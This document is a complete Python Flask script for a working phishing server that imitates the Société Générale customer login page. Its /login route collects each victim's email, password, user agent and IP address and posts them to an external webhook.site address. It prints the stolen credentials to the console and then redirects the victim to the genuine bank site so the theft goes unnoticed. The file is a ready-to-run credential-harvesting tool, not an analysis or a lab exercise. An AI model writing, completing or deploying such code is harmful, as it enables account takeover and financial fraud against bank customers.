from flask import Flask, request, redirect
import requests

app = Flask(__name__)

WEBHOOK_URL = " https://webhook.site/9cafa90d-2d9e-4cc3-a60e-4fbbc1c2ff3a"


REAL_SG_URL = "https://www.societegenerale.com/fr/particulier/espace-client"


try:
    with open('index.html', 'r', encoding='utf-8') as f:
        html_content = f.read()
except FileNotFoundError:
    html_content = "<h1>Chargement de la page...</h1>"

@app.route('/')
def home():
    return html_content

@app.route('/login', methods=['POST'])
def login():
    
    email = request.form.get('email')
    password = request.form.get('password')
    user_agent = request.headers.get('User-Agent')
    ip_address = request.remote_addr

    
    data_to_send = {
        "Date": "2026-08-04",
        "Email": email,
        "Mot de passe": password,
        "Appareil": user_agent,
        "Adresse IP": ip_address
    }

    try:
        requests.post(WEBHOOK_URL, json=data_to_send, timeout=5)
        print(f"[+] Données reçues : {email} / {password}")
    except Exception as e:
        print(f"[-] Erreur : {e}")

    
    return redirect(REAL_SG_URL)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
